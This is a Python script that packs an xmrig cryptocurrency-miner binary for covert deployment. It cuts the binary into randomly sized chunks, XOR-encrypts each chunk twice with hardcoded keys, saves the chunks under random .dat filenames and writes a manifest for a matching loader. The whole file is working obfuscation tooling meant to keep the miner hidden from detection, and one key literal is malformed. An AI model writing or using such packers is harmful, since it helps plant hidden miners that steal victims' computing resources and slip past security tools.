#!/usr/bin/env python3
"""
Re-chunk xmrig binary with proper double XOR encryption.
Splits binary into random-sized chunks and encrypts with KEY2 then KEY.
"""

import os
import random
import itertools
import hashlib

# Keys must match loader.py
_KEY = b'\x7f\x45\x4c\x46\x02\x01\x01\x00'
_KEY2 = b'\xde\xad\xbe\xef\xcafe\xba\xbe'

def double_encrypt(data: bytes) -> bytes:
    """Encrypt: plaintext → XOR(KEY2) → XOR(KEY) → ciphertext"""
    stage1 = bytes(a ^ b for a, b in zip(data, itertools.cycle(_KEY2)))
    stage2 = bytes(a ^ b for a, b in zip(stage1, itertools.cycle(_KEY)))
    return stage2


def chunk_binary(binary_path: str, output_dir: str, num_chunks: int = 54):
    """Split binary into random-sized chunks and encrypt."""
    
    # Read binary
    with open(binary_path, 'rb') as f:
        data = f.read()
    
    total_size = len(data)
    print(f"Binary size: {total_size:,} bytes")
    
    # Generate random chunk sizes
    min_chunk = 32 * 1024  # 32 KB
    max_chunk = 256 * 1024  # 256 KB
    
    chunks = []
    remaining = total_size
    offset = 0
    
    while remaining > 0:
        if len(chunks) >= num_chunks - 1:
            # Last chunk gets all remaining
            size = remaining
        else:
            size = min(random.randint(min_chunk, max_chunk), remaining)
        
        chunk_data = data[offset:offset + size]
        chunks.append(chunk_data)
        offset += size
        remaining -= size
    
    print(f"Split into {len(chunks)} chunks")
    
    # Clear output directory
    os.makedirs(output_dir, exist_ok=True)
    for f in os.listdir(output_dir):
        if f.endswith('.dat'):
            os.remove(os.path.join(output_dir, f))
    
    # Write encrypted chunks
    for i, chunk in enumerate(chunks):
        encrypted = double_encrypt(chunk)
        filename = f"{random.randbytes(8).hex()}.dat"
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'wb') as f:
            f.write(encrypted)
        
        print(f"  {i+1}/{len(chunks)}: {filename} ({len(chunk):,} bytes → {len(encrypted):,} bytes)")
    
    # Write manifest
    manifest_path = os.path.join(output_dir, 'mf.bin')
    manifest_data = f"{len(chunks)}\n{total_size}\n".encode()
    with open(manifest_path, 'wb') as f:
        f.write(manifest_data)
    
    print(f"\n✓ Created {len(chunks)} encrypted chunks in {output_dir}")
    print(f"✓ Manifest: {manifest_path}")


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 rechunk_from_binary.py <xmrig_binary_path>")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_dir = os.path.join(script_dir, '..', 'data')
    
    if not os.path.exists(binary_path):
        print(f"ERROR: Binary not found: {binary_path}")
        sys.exit(1)
    
    chunk_binary(binary_path, output_dir)
